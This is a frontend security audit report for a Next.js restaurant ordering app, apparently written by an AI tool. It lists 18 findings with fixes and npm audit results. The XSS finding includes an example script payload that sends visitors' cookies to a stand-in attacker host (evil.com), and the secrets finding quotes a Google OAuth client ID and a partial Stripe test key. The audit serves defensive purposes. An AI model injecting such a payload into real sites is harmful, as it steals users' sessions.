# Shahrayar Frontend Security Audit

**Audit Date:** 2026-03-28
**Auditor:** Cursor Audit (Claude Opus)
**Scope:** Frontend only (Next.js / React) — `E:\Peak Link Project\shahriar\Shahrayar next.js`
**Reference Project:** Magic Show Front-End

---

## Summary

- **Total vulnerabilities found: 18**
- **Critical: 2** | **High: 6** | **Medium: 5** | **Low: 5**

---

## CRITICAL Findings

### [C1] No Middleware Route Protection — Client-Only Auth Guard

- **File:** `middleware.js` (lines 1–35)
- **Severity:** CRITICAL
- **Description:** The middleware only forwards the `Authorization` header. It performs zero authentication checks and never redirects unauthenticated users. All route protection relies solely on the client-side `<Protected>` component, which runs after JS hydration — causing a **flash of protected content** on every protected page load.
- **Affected routes:** `/cart`, `/checkout`, `/profile`, `/orders`, `/orders/[id]`
- **Exploit scenario:** An unauthenticated user can navigate to `/profile` or `/checkout` and briefly see the full page skeleton/layout before being redirected. Bots and scrapers see the unprotected HTML. With JS disabled, the page renders fully without any redirect.
- **Current code:**
  ```js
  // middleware.js — does NOT check auth
  export function middleware(request) {
    const response = NextResponse.next();
    const authHeader = request.headers.get('authorization');
    if (authHeader) {
      response.headers.set('authorization', authHeader);
    }
    return response;
  }
  ```
- **Recommended fix:** Add cookie-based auth check with redirect, matching Magic Show's pattern:
  ```js
  export function middleware(request) {
    const token = request.cookies.get('auth-token')?.value ||
                  request.headers.get('authorization')?.replace('Bearer ', '');
    const pathname = request.nextUrl.pathname;

    const protectedRoutes = ['/cart', '/checkout', '/profile', '/orders'];
    const isProtectedRoute = protectedRoutes.some(r => pathname.startsWith(r));

    if (isProtectedRoute && !token) {
      const loginUrl = new URL('/login', request.url);
      loginUrl.searchParams.set('redirect', pathname);
      return NextResponse.redirect(loginUrl);
    }
    return NextResponse.next();
  }

  export const config = {
    matcher: ['/cart/:path*', '/checkout/:path*', '/profile/:path*', '/orders/:path*'],
  };
  ```
- **Prerequisite:** Finding H4 (cookie sync) must be fixed first — authStore must write an `auth-token` cookie on login so middleware can read it.
- **Fix applied:** No (requires code changes in follow-up session)

---

### [C2] 20 of 24 Pages Use `"use client"` — Entire App is CSR

- **File:** 20 `page.jsx` files under `src/app/`
- **Severity:** CRITICAL
- **Description:** 83% of page files begin with `"use client"`, converting the entire page component tree (including data fetching, SEO, layout) into client-side JavaScript. This eliminates all SSR/SSG benefits: no server-rendered HTML for crawlers, no streaming, no reduced JS bundle, no server-side data fetching.
- **Affected pages (with `"use client"`):**
  | Route | File |
  |-------|------|
  | `/shop` | `src/app/shop/page.jsx` |
  | `/cart` | `src/app/cart/page.jsx` |
  | `/checkout` | `src/app/checkout/page.jsx` |
  | `/profile` | `src/app/profile/page.jsx` |
  | `/orders` | `src/app/orders/page.jsx` |
  | `/orders/[id]` | `src/app/orders/[id]/page.jsx` |
  | `/orders/[id]/success` | `src/app/orders/[id]/success/page.jsx` |
  | `/login` | `src/app/login/page.jsx` |
  | `/register` | `src/app/register/page.jsx` |
  | `/forgot-password` | `src/app/forgot-password/page.jsx` |
  | `/reset-password` | `src/app/reset-password/page.jsx` |
  | `/verify-reset-token` | `src/app/verify-reset-token/page.jsx` |
  | `/add-phone` | `src/app/add-phone/page.jsx` |
  | `/enter-otp` | `src/app/enter-otp/page.jsx` |
  | `/add-information` | `src/app/add-information/page.jsx` |
  | `/confirm-information` | `src/app/confirm-information/page.jsx` |
  | `/checkout/stripe/pay` | `src/app/checkout/stripe/pay/page.jsx` |
  | `/checkout/stripe/success` | `src/app/checkout/stripe/success/page.jsx` |
  | `/checkout/stripe/failed` | `src/app/checkout/stripe/failed/page.jsx` |
  | `/checkout/stripe/cancel` | `src/app/checkout/stripe/cancel/page.jsx` |
- **Pages that are Server Components (correct):** `/` (home), `/about-us`, `/contact-us`, `/shop/[id]`
- **Exploit scenario:** Search engines receive empty `<div>` shells with no content, destroying SEO. Lighthouse scores suffer. Users on slow networks see blank pages until JS loads.
- **Recommended fix:** Remove `"use client"` from page files. Push it down to leaf interactive components only. Use `dynamic()` imports for client-only sections. Replace `useLanguage()` calls with server-side `getLanguage()`.
- **Fix applied:** No (requires page-by-page refactor in follow-up sessions)

---

## HIGH Findings

### [H1] PageSEO Uses Client-Side DOM Manipulation — Invisible to Crawlers

- **File:** `src/components/seo/PageSEO.jsx` (lines 1–77)
- **Severity:** HIGH
- **Description:** `PageSEO` is a `"use client"` component that uses `useEffect` to mutate `document.title` and inject `<meta>` tags into `<head>` after hydration. Search engine crawlers execute minimal or no JavaScript — they see the root layout's generic metadata, not the page-specific titles and descriptions.
- **Exploit scenario:** Google indexes all pages with the same generic title "Shahrayar Restaurant - Authentic Middle Eastern Cuisine" instead of page-specific titles. OG/Twitter cards show generic data on social shares.
- **Recommended fix:** Replace with Next.js `metadata` export (static pages) or `generateMetadata()` (dynamic pages):
  ```jsx
  // src/app/shop/page.jsx — server component
  export const metadata = {
    title: 'Shop - Browse Our Menu',
    description: 'Browse our delicious menu...',
    openGraph: { title: 'Shop', description: '...' },
  };
  ```
- **Fix applied:** No

---

### [H2] `dangerouslySetInnerHTML` Without Sanitization — XSS Vector

- **File:** `src/components/pages/legal/LegalContentSection.jsx` (line 106)
- **Severity:** HIGH
- **Description:** Raw HTML from the API (`content.content`) is rendered directly via `dangerouslySetInnerHTML` with no sanitization. If the CMS/API is compromised or an admin injects malicious HTML, it executes in all users' browsers.
- **Current code:**
  ```jsx
  dangerouslySetInnerHTML={{ __html: content.content }}
  ```
- **Exploit scenario:** A stored XSS payload in the legal content (e.g., `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`) executes for every visitor viewing terms/privacy pages.
- **Recommended fix:** Install `isomorphic-dompurify` and sanitize:
  ```jsx
  import DOMPurify from 'isomorphic-dompurify';
  // ...
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content.content) }}
  ```
- **Fix applied:** No

---

### [H3] No HTTP Security Headers

- **File:** `next.config.ts` (lines 1–59)
- **Severity:** HIGH
- **Description:** The Next.js configuration has zero HTTP security headers. Missing headers expose the application to clickjacking, MIME-type sniffing, and information leakage attacks.
- **Missing headers:**
  - `X-Frame-Options` — clickjacking protection
  - `X-Content-Type-Options` — MIME sniffing protection
  - `X-XSS-Protection` — legacy XSS filter
  - `Referrer-Policy` — referrer information leakage
  - `Permissions-Policy` — API access restrictions (camera, microphone, geolocation)
- **Recommended fix:** Add `headers()` function to `next.config.ts`:
  ```ts
  async headers() {
    return [{
      source: '/(.*)',
      headers: [
        { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'X-XSS-Protection', value: '1; mode=block' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
      ],
    }];
  },
  ```
- **Fix applied:** No

---

### [H4] Auth Token Only in localStorage — No Cookie Sync for Middleware

- **File:** `src/store/authStore.js` (lines 15–758)
- **Severity:** HIGH
- **Description:** The auth token is stored exclusively in `localStorage` via Zustand persist (`auth-storage` key). No JavaScript-accessible cookie is written. This means `middleware.js` can never read the token from cookies to perform server-side auth checks. This is the root cause of C1 (no middleware protection).
- **Comparison:** Magic Show writes a JS cookie `auth-token` (SameSite=Lax, 7-day expiry) on login/logout/setToken/hydrate, so middleware can read it.
- **Recommended fix:** In the `login`, `register`, `completeRegistration`, and `loginWithGoogle` actions, write a cookie alongside localStorage:
  ```js
  // After setting state with token:
  if (typeof document !== 'undefined') {
    document.cookie = `auth-token=${token}; path=/; max-age=${7*24*60*60}; SameSite=Lax`;
  }
  ```
  And in `logout`:
  ```js
  document.cookie = 'auth-token=; path=/; max-age=0';
  ```
- **Fix applied:** No

---

### [H5] Excessive `console.log` in Production — Information Leakage

- **File:** `src/app/checkout/stripe/success/page.jsx` (8 occurrences), `src/api/config/axios.js` (2 occurrences), plus 5 other files
- **Severity:** HIGH
- **Description:** The Stripe success page contains 8 `console.log` statements that dump sensitive payment data (payment intent IDs, order status, full error objects with response data) to the browser console in production. While `next.config.ts` has `removeConsole` enabled for production builds, the `axios.js` client interceptor has unguarded `console.log` calls that log auth tokens from storage:
  ```js
  // axios.js lines 126-127
  console.log('localStorage auth-storage:', localStorage.getItem('auth-storage'));
  console.log('sessionStorage registrationToken:', sessionStorage.getItem('registrationToken'));
  ```
  These are inside the `complete-registration` debug block and would log the raw token string.
- **Recommended fix:** Guard all client-side `console.log` with `process.env.NODE_ENV !== 'production'` or remove them entirely.
- **Fix applied:** No

---

### [H6] `.env.local` Contains Real Stripe Test Key and Google OAuth Credentials

- **File:** `.env.local` (lines 1–4)
- **Severity:** HIGH
- **Description:** The `.env.local` file contains:
  - A commented but real-looking Stripe publishable test key: `pk_test_51SFA2MBPb...`
  - A Google OAuth client ID: `415269339168-uokg13acf512u65ifajfpsqms1jp8jn4.apps.googleusercontent.com`
  - A Google redirect URI pointing to `http://localhost:3000` (HTTP, not HTTPS)
- **Mitigating factor:** `.env*` is in `.gitignore`, so this is not committed. However, the Stripe key should be rotated if it was ever exposed. The Google redirect URI using plain HTTP is a concern for production.
- **Recommended fix:** Rotate the Stripe key in the Stripe dashboard. Ensure production `.env` uses HTTPS redirect URIs. Never store real keys in comments.
- **Fix applied:** No

---

## MEDIUM Findings

### [M1] In-Memory `Map()` Cache in Server Components — Memory Leak

- **Files:** `src/app/page.jsx` (lines 12–26), `src/app/about-us/page.jsx` (lines 13–27), `src/app/contact-us/page.jsx` (lines 13–27)
- **Severity:** MEDIUM
- **Description:** Three Server Component pages use a module-level `const cache = new Map()` with manual TTL logic for caching API responses. In production (serverless/edge), module-level state is not shared across instances and may leak memory as the Map grows unbounded within a single instance's lifetime.
- **Recommended fix:** Replace with Next.js `unstable_cache` (or the `cachedServerApi` pattern from Magic Show which wraps it):
  ```js
  import { unstable_cache } from 'next/cache';
  const getData = unstable_cache(
    async () => { /* fetch */ },
    ['cache-key'],
    { revalidate: 300, tags: ['home'] }
  );
  ```
- **Fix applied:** No

---

### [M2] `LanguageContext` Forces CSR on Consumer Components

- **File:** `src/context/LanguageContext.jsx`
- **Severity:** MEDIUM
- **Description:** `LanguageContext` is a `"use client"` context provider wrapping the root layout. Every component that calls `useLanguage()` becomes a Client Component, even if it has no other client-side requirements. This propagates CSR throughout the component tree unnecessarily.
- **Comparison:** Magic Show reads language from cookies server-side via `getLanguage()` (async function using `cookies()` from `next/headers`), keeping pages as Server Components.
- **Recommended fix:** For server components, use `getLanguage()` from `src/lib/getLanguage.js`. For client components, use `getLanguageClient()` (reads from cookie directly). Remove `LanguageProvider` from root layout once pages are migrated.
- **Fix applied:** No

---

### [M3] Zero `loading.jsx` or `error.jsx` Files — No Route-Level Boundaries

- **File:** All route directories under `src/app/`
- **Severity:** MEDIUM
- **Description:** Shahrayar has zero `loading.jsx` or `error.jsx` files at any route level. During navigation, users see no loading feedback. Uncaught errors in any page component crash the entire page with no graceful fallback.
- **Comparison:** Magic Show has `loading.jsx` for 11 routes and `error.jsx` for 9 routes, plus root-level `loading.jsx`, `error.jsx`, `global-error.jsx`, and `not-found.jsx`.
- **Shahrayar has:** Only `not-found.jsx` at root level.
- **Recommended fix:** Add `loading.jsx` and `error.jsx` to every route segment, starting with the most-visited routes (`/`, `/shop`, `/shop/[id]`, `/checkout`, `/profile`). Add root-level `loading.jsx`, `error.jsx`, and `global-error.jsx`.
- **Fix applied:** No

---

### [M4] `dangerouslyAllowSVG: true` Without CSP Sandbox

- **File:** `next.config.ts` (line 26)
- **Severity:** MEDIUM
- **Description:** SVG image rendering is enabled via `dangerouslyAllowSVG: true`, but no `contentSecurityPolicy` is configured to sandbox SVG execution. Malicious SVGs can contain embedded JavaScript.
- **Current config:**
  ```ts
  dangerouslyAllowSVG: true
  // No contentSecurityPolicy set
  ```
- **Recommended fix:** Add CSP sandbox:
  ```ts
  dangerouslyAllowSVG: true,
  contentDispositionType: 'attachment',
  contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;",
  ```
- **Fix applied:** No

---

### [M5] Forgot-Password and Reset-Password Forms Use Manual Validation Instead of Zod

- **Files:** `src/components/pages/forgot-password/ForgotPasswordForm.jsx`, `src/components/pages/reset-password/ResetPasswordForm.jsx`, `src/components/pages/confirm-information/ConfirmPasswordForm.jsx`
- **Severity:** MEDIUM
- **Description:** While Login, Register, Contact, and Checkout forms use Zod schema validation, the password reset flow uses manual `if/else` validation with weak patterns:
  - Email validation uses `!/\S+@\S+\.\S+/.test(email)` — accepts invalid emails like `a@b.c`
  - Password validation only checks length (>= 8 or >= 6 in ConfirmPasswordForm), no complexity requirements
  - No centralized validation schema — each form has its own inline rules
- **Recommended fix:** Create Zod schemas in `src/lib/validations/authSchemas.js` for `forgotPasswordSchema` and `resetPasswordSchema`, then use `zodResolver` with `react-hook-form` consistently across all auth forms.
- **Fix applied:** No

---

## LOW Findings

### [L1] `PageSEO` Duplicates Root Layout Metadata

- **File:** `src/app/layout.jsx` (lines 22–81) vs `src/components/seo/PageSEO.jsx`
- **Severity:** LOW
- **Description:** Root layout exports comprehensive `metadata` (title template, description, OG, Twitter, robots). Every page also renders `<PageSEO>` which attempts to override the same tags client-side. Even when `PageSEO` is replaced with server-side `metadata` exports, care must be taken to use the title template (`%s | Shahrayar Restaurant`) rather than duplicating the suffix logic.
- **Fix applied:** No

---

### [L2] Unused/Redundant Dependencies

- **File:** `package.json`
- **Severity:** LOW
- **Description:**
  - `"cross": "^1.0.0"` — appears to be a mistake; `cross-env` is already in devDependencies
  - `"next-intl": "^4.5.5"` — the project uses a custom `i18n/getTranslation.js`, not `next-intl`
  - `"next-seo": "^7.0.1"` — not imported anywhere in the codebase; the project uses `PageSEO` custom component and `metadata` exports
  - `"smooth-scrollbar": "^8.8.4"` — project uses `lenis` for smooth scrolling; `smooth-scrollbar` may be unused
- **Recommended fix:** Remove unused packages to reduce bundle size and attack surface:
  ```bash
  npm uninstall cross next-intl next-seo smooth-scrollbar
  ```
- **Fix applied:** No

---

### [L3] `LanguageProvider` Reads Default Language Before Cookie Hydration

- **File:** `src/context/LanguageContext.jsx`
- **Severity:** LOW
- **Description:** `LanguageProvider` initializes with `i18n.defaultLocale` and only reads the `language` cookie in a `useEffect` after mount. This causes a brief flash where the UI renders in the default locale before switching to the user's saved language.
- **Recommended fix:** Read the cookie synchronously during initialization or use server-side language detection (`getLanguage()`) passed as a prop.
- **Fix applied:** No

---

### [L4] `AuthTokenInjector` Exposes Token in Custom Request Header

- **File:** `src/components/layout/AuthTokenInjector.jsx`
- **Severity:** LOW
- **Description:** `AuthTokenInjector` reads the auth token from localStorage and sets a custom header on outgoing requests. While this is needed for the current architecture (forwarding to server components via middleware), it means the token transits via a custom mechanism rather than standard cookies. This is a design limitation rather than a direct vulnerability, but it increases the attack surface compared to HttpOnly cookie auth.
- **Recommended fix:** Migrate to cookie-based auth token storage (see H4) which eliminates the need for `AuthTokenInjector` entirely.
- **Fix applied:** No

---

### [L5] Stripe Success Page Has No Auth Protection

- **File:** `src/app/checkout/stripe/success/page.jsx`
- **Severity:** LOW
- **Description:** The Stripe success page is publicly accessible and takes `order_id` and `payment_intent` from URL query params. While the backend validates these server-side, the page itself exposes order details (ID, status, total amount) to anyone with the URL. The page also has no `<Protected>` wrapper unlike other checkout pages.
- **Recommended fix:** Wrap in `<Protected>` and verify the order belongs to the authenticated user before displaying details.
- **Fix applied:** No

---

## Dependency Vulnerabilities

`npm audit` found **10 vulnerabilities** (4 moderate, 5 high, 1 critical):

| Package | Severity | Advisory | Fix Available |
|---------|----------|----------|---------------|
| `swiper` 6.5.1–12.1.1 | **CRITICAL** | Prototype pollution (GHSA-hmx5-qpq5-p643) | Yes (`npm audit fix`) |
| `next` 15.6.0–16.1.6 | **HIGH** | 8 advisories: DoS via Image Optimizer, CSRF bypass, memory exhaustion, HTTP smuggling, disk cache growth | Yes (`npm audit fix`) |
| `axios` 1.0.0–1.13.4 | **HIGH** | DoS via `__proto__` key in mergeConfig (GHSA-43fc-jf86-j433) | Yes (`npm audit fix`) |
| `flatted` <=3.4.1 | **HIGH** | Unbounded recursion DoS + prototype pollution | Yes (`npm audit fix`) |
| `minimatch` <=3.1.3 | **HIGH** | Multiple ReDoS vulnerabilities | Yes (`npm audit fix`) |
| `picomatch` <=2.3.1 | **HIGH** | Method injection + ReDoS | Yes (`npm audit fix`) |
| `ajv` <6.14.0 | MODERATE | ReDoS with `$data` option | Yes (`npm audit fix`) |
| `brace-expansion` <1.1.13 | MODERATE | Zero-step sequence hang | Yes (`npm audit fix`) |
| `js-yaml` 4.0.0–4.1.0 | MODERATE | Prototype pollution in merge | Yes (`npm audit fix`) |
| `yaml` 2.0.0–2.8.2 | MODERATE | Stack overflow via nested collections | Yes (`npm audit fix`) |

**Immediate action:** Run `npm audit fix` to address all fixable vulnerabilities.

---

## Findings Summary Table

| ID | Severity | Category | File | Fix Status |
|----|----------|----------|------|------------|
| C1 | CRITICAL | Route Protection | `middleware.js` | Pending |
| C2 | CRITICAL | Architecture/SEO | 20 `page.jsx` files | Pending |
| H1 | HIGH | SEO | `src/components/seo/PageSEO.jsx` | Pending |
| H2 | HIGH | XSS | `src/components/pages/legal/LegalContentSection.jsx` | Pending |
| H3 | HIGH | Security Headers | `next.config.ts` | Pending |
| H4 | HIGH | Auth Token Storage | `src/store/authStore.js` | Pending |
| H5 | HIGH | Information Leakage | `src/app/checkout/stripe/success/page.jsx`, `src/api/config/axios.js` | Pending |
| H6 | HIGH | Secrets Exposure | `.env.local` | Pending (rotate keys) |
| M1 | MEDIUM | Memory Leak | `src/app/page.jsx`, `about-us/page.jsx`, `contact-us/page.jsx` | Pending |
| M2 | MEDIUM | Architecture | `src/context/LanguageContext.jsx` | Pending |
| M3 | MEDIUM | Error Handling | All route directories | Pending |
| M4 | MEDIUM | SVG Security | `next.config.ts` | Pending |
| M5 | MEDIUM | Input Validation | Forgot/reset password forms | Pending |
| L1 | LOW | SEO Duplication | `layout.jsx` / `PageSEO.jsx` | Pending |
| L2 | LOW | Dependencies | `package.json` | Pending |
| L3 | LOW | i18n Flash | `LanguageContext.jsx` | Pending |
| L4 | LOW | Auth Design | `AuthTokenInjector.jsx` | Pending |
| L5 | LOW | Access Control | `checkout/stripe/success/page.jsx` | Pending |
